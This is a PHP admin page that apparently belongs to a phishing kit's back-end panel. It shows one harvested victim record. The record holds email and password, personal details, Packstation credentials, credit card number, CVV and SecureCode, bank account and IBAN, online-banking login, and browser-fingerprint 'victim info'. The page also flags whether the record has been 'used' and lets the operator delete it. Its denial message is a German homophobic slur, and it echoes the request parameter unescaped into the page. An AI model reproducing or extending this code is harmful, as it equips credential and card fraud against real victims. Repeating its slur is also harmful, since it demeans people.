<?php
	session_start();
	require_once("admin_config.php");
	
	if (!isset($_SESSION['adminlogin']) && !isset($_SESSION['adminUsername']) && !isset($_SESSION['adminPassword'])) {
		die("VERPISS DICH DU SCHWULER");
	} else {
		if ($_SESSION['adminUsername'] != $adminUsername && $_SESSION['adminPassword'] != $adminPassword) {
			die("VERPISS DICH DU SCHWULER");
		}
	}
	
	$log = null;
	$clean_log_id = null;
	
	if (!ctype_digit($_GET['log_id'])) {
		die("VERPISS DICH DU SCHWULER");
	} else {
		$query = 'SELECT 
								`id`, `logtime`, `username`, `passwort`, 
								`vorname`, `nachname`, `geburtsdatum`, `adresse`, `plz`, `ort`, `tlfnr`, `handynr`, `ps_nr`, `ps_pw`,
								`ccnr`, `ccdate`, `cvv`, `cclimit`, `securecode`, `servicekartennummer`, `notiz`,
								`kto`, `blz`, `iban`, `bic`, `ob_login`, `ob_pass`, 
								`brand`, `bank`, `country`, `category`, `binlevel`,
								vic_info_lang, vic_info_browser, vic_info_os, vic_info_screen, vic_info_plugins, vic_info_java, vic_info_flash, vic_info_silver, vic_info_mime, vic_info_fonts,
								`p_domain`, `useragent`, `ip`, `used` FROM ' . $myTable . '  WHERE id=' . $_GET['log_id'];
		
		if (!($stmt = $mySQLcon->prepare($query))) {
			die("Prepare failed: (" . $mySQLcon->errno . ") " . $mySQLcon->error);
		}

		if (!$stmt->execute()) {
			die("Execute failed: (" . $mySQLcon->errno . ") " . $mySQLcon->error);
		}
		
		$out_id = NULL;
		$out_time = NULL;
		
		$out_user = NULL;
		$out_pass = NULL;
		$out_vorname = NULL;
		$out_nachname = NULL;
		$out_dob = NULL;
		$out_adresse = NULL;
		$out_plz = NULL;
		$out_ort = NULL;
		$out_tlfnr = NULL;
		$out_handynr = NULL;
		
		$out_ps_nr = NULL;
		$out_ps_pw = NULL;
		
		$out_ccnr = NULL;
		$out_ccdate = NULL;
		$out_cvv = NULL;
		$out_limit = NULL;
		
		$out_sc = NULL;
		$out_sk = NULL;
		
		$out_notiz = NULL;
		
		$out_kto = NULL;
		$out_blz = NULL;
		$out_iban = NULL;
		$out_bic = NULL;
		
		$out_ob_user = NULL;
		$out_ob_pass = NULL;
		
		$out_brand = NULL;
		$out_bank2 = NULL;
		$out_country = NULL;
		$out_category = NULL;
		$out_level = NULL;
		
		$vic_info_lang = NULL;
		$vic_info_browser = NULL;
		$vic_info_os = NULL;
		$vic_info_screen = NULL;
		$vic_info_plugins = NULL;
		$vic_info_java = NULL;
		$vic_info_flash = NULL;
		$vic_info_silver = NULL;
		$vic_info_mime = NULL;
		$vic_info_fonts = NULL;
		
		$out_domain = NULL;
		$out_useragent = NULL;
		$out_ip = NULL;
		
		$out_used = NULL;
		
		if (!$stmt->bind_result($out_id, $out_time, $out_user, $out_pass, 
											 $out_vorname, $out_nachname, $out_dob, $out_adresse, $out_plz, $out_ort, $out_tlfnr, $out_handynr, $out_ps_nr, $out_ps_pw,
											 $out_ccnr, $out_ccdate, $out_cvv, $out_limit, $out_sc, $out_sk, $out_notiz,
											 $out_kto, $out_blz, $out_iban, $out_bic, $out_ob_user, $out_ob_pass,
											 $out_brand, $out_bank2, $out_country, $out_category, $out_level,
											 $vic_info_lang, $vic_info_browser, $vic_info_os, $vic_info_screen, $vic_info_plugins, $vic_info_java, $vic_info_flash, $vic_info_silver, $vic_info_mime, $vic_info_fonts, 
											 $out_domain, $out_useragent, $out_ip, $out_used)) {
											 
			die("Binding 0output parameters failed: (" . $stmt->errno . ") " . $stmt->error);
		}

		while ($stmt->fetch()) {
			$clean_log_id = $out_id;
			
			$log .= '
							<b>#ID</b>: ' . $out_id  . ' | 
							<b>Datum</b>: ' . $out_time  . ' | 
							<b>E-Mail</b>: ' . htmlspecialchars($out_user)  . ' | 
							<b>Passwort</b>: ' . htmlspecialchars($out_pass)  . ' | 
							<b>Vorname</b>: ' . htmlspecialchars($out_vorname)  . ' | 
							<b>Nachname</b>: ' . htmlspecialchars($out_nachname)  . ' | 
							<b>Geburtsdatum</b>: ' . htmlspecialchars($out_dob)  . ' | 
							<b>Adresse</b>: ' . htmlspecialchars($out_adresse)  . ' | 
							<b>Postleitzahl</b>: ' . htmlspecialchars($out_plz)  . ' | 
							<b>Wohnort</b>: ' . htmlspecialchars($out_ort)  . ' | 
							<b>Telefonnummer</b>: ' . htmlspecialchars($out_tlfnr)  . ' | 
							<b>Handynummer</b>: ' . htmlspecialchars($out_handynr)  . ' | 
							<b>Packstation PostNummer</b>: ' . htmlspecialchars($out_ps_nr)  . ' | 
							<b>Packstation Passwort</b>: ' . htmlspecialchars($out_ps_pw)  . ' | 
							 | ';
							
							if ($out_ccnr != "skipped") {
								$log .= '<b>Kreditkartennummer</b>: ' . htmlspecialchars($out_ccnr)  . ' | 
								<b>G&uuml;ltigkeit</b>: ' . $out_ccdate  . ' | 
								<b>Pr&uuml;fziffer</b>: ' . htmlspecialchars($out_cvv)  . ' | 
								<b>Limit</b>: ' . htmlspecialchars($out_limit)  . ' | 
								<b>Securecode</b>: ' . htmlspecialchars($out_sc)  . ' | 
								<b>Servicekartennummer</b>: ' . htmlspecialchars($out_sk)  . ' | 
								<b>Marke</b>: ' . htmlspecialchars($out_brand)  . ' | 
								<b>Bank</b>: ' . htmlspecialchars($out_bank2)  . ' | 
								<b>Land</b>: ' . htmlspecialchars($out_country)  . ' | 
								<b>Kategorie</b>: ' . htmlspecialchars($out_category)  . ' | 
								<b>Level</b>: ' . htmlspecialchars($out_level)  . ' | ';
							}
							
							$log .= '<b>Kontonummer</b>: ' . htmlspecialchars($out_kto)  . ' | 
							<b>Bankleitzahl</b>: ' . htmlspecialchars($out_blz)  . ' | 
							<b>IBAN</b>: ' . htmlspecialchars($out_iban)  . ' | 
							<b>BIC</b>: ' . htmlspecialchars($out_bic)  . ' | 
							<b>OB-Login</b>: ' . htmlspecialchars($out_ob_user)  . ' | 
							<b>OB-Pass</b>: ' . htmlspecialchars($out_ob_pass)  . ' | ';
							
							if ($show_vic_infos) {
								$log .= '<b>Sprache(n)</b>: ' . htmlspecialchars($vic_info_lang)  . ' | 
								<b>Browser</b>: ' . htmlspecialchars($vic_info_browser)  . ' | 
								<b>Betriebssystem</b>: ' . htmlspecialchars($vic_info_os)  . ' | 
								<b>Screen-Resolution</b>: ' . htmlspecialchars($vic_info_screen)  . ' | 
								<b>Plugins</b>: ' . htmlspecialchars($vic_info_plugins)  . ' | 
								<b>Java aktiv? Version?</b>: ' . htmlspecialchars($vic_info_java)  . ' | 
								<b>Flash aktiv? Version?</b>: ' . htmlspecialchars($vic_info_flash)  . ' | 
								<b>Silverlight aktiv? Version?</b>: ' . htmlspecialchars($vic_info_silver)  . ' | 
								<b>Mimetypes</b>: ' . htmlspecialchars($vic_info_mime)  . ' | 
								<b>Fonts</b>: ' . htmlspecialchars($vic_info_fonts)  . ' | ';
							}
							
							if (!empty($out_notiz)) {
								$log .= '<b>Notiz</b>: ' . htmlspecialchars($out_notiz)  . ' | ';
							}
			
							$ip_address = null;
							if (strpos($out_ip, ',') !== false) {
								$ip_address = explode(",", $out_ip)[0];
							} else {
								$ip_address = $out_ip;
							}
							
			$log .= 	'
							<b>Useragent</b>: ' . $out_useragent  . ' | 
							<b>IP-Adresse</b>: ' . $ip_address  . ' | 
							<b>IP-Hostname</b>: ' . gethostbyaddr($ip_address)  . ' | 
							<b>Benutzt?</b>: ' . (($out_used == 0) ? "N" : "Y");
		}
		$stmt->close(); 
	}
?>

<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="ISO-8859-1">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link rel="shortcut icon" href="src/img/favicon.ico">
	<title>Log #<?php echo $_GET['log_id'] ?></title>
	<link href="src/css/bootstrap.css" rel="stylesheet">
	<link href="src/css/bootstrap-theme.css" rel="stylesheet">
	<meta http-equiv="content-type" content="text/html; charset=UTF-8">
</head>

<body>
	<div class="panel panel-default" style="width:500px;margin: 10px auto">
		<div class="panel-heading">
			<h3 class="panel-title">
				Log #<?php echo $_GET['log_id'] ?>
			</h3>
			<form action="index.php" method="POST">
				<button type="submit" id="removeEntry" name="removeEntry" value="<?php echo $clean_log_id ?>" class="btn btn-sm btn-danger" style="float:right;margin-top:-15px;padding:5px;width:150px;height:22px;line-height:0">
					Log entfernen <span class="glyphicon glyphicon-remove-circle" style="top:0.3px;line-height:0.7px"></span>
				</button>
			</form>
		</div>
		<div class="panel-body">
			<div class="form-group">
				<div class="editable" contenteditable="false" style="font-size:12px"><?php echo $log ?></div>
			</div>
		</div>
	</div>
</body>
</html>